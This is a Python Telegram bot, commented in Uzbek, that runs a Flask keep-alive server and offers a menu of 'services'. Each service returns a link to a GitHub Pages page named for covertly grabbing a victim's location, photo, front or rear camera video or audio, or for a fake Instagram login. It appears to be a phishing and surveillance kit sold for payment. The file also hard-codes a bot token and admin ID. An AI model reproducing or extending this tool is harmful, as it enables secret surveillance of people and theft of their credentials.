import telebot
from telebot import types
import os
from flask import Flask
from threading import Thread

# Render port xatosi bermasligi uchun server
app = Flask('')
@app.route('/')
def home():
    return "Bot is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

TOKEN = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI'
ADMIN_ID = 8275787221 
URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"

bot = telebot.TeleBot(TOKEN)

# ASOSIY MENYU
def main_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
    kb.add(types.KeyboardButton("❓ Qoidalar"), types.KeyboardButton("📞 Bog'lanish"))
    kb.add(types.KeyboardButton("💳 To'lov qilish"))
    return kb

# XIZMATLAR MENYUSI
def services_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
    kb.add(types.KeyboardButton("🎥 Old kamera video"), types.KeyboardButton("🔑 Instagram login"))
    kb.add(types.KeyboardButton("🎬 Orqa kamera video"), types.KeyboardButton("🎵 Audio yozish"))
    kb.add(types.KeyboardButton("⬅️ Asosiy menyu"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ Bot doimiy rejimda ishga tushdi!", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_all(m):
    # Tugma matnini aniq tekshirish (Emoji bilan birga)
    if m.text == "🔐 Xizmatlar":
        bot.send_message(m.chat.id, "Bo'limni tanlang:", reply_markup=services_menu())
    
    elif m.text == "⬅️ Asosiy menyu":
        bot.send_message(m.chat.id, "Asosiy menyuga qaytdingiz:", reply_markup=main_menu())

    elif m.text == "📸 Rasm olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")

    elif m.text == "📍 Lokatsiya olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/index-1.html")

    elif m.text == "🎥 Old kamera video":
        bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")

    elif m.text == "🎬 Orqa kamera video":
        # GitHub'dagi fayl nomiga mos ravishda (probel va nuqta bilan)
        bot.send_message(m.chat.id, f"Havola: {URL}/Orqa%20kamera%20video%20.html")

    elif m.text == "🔑 Instagram login":
        bot.send_message(m.chat.id, f"Havola: {URL}/instagram.html")

    elif m.text == "🎵 Audio yozish":
        bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
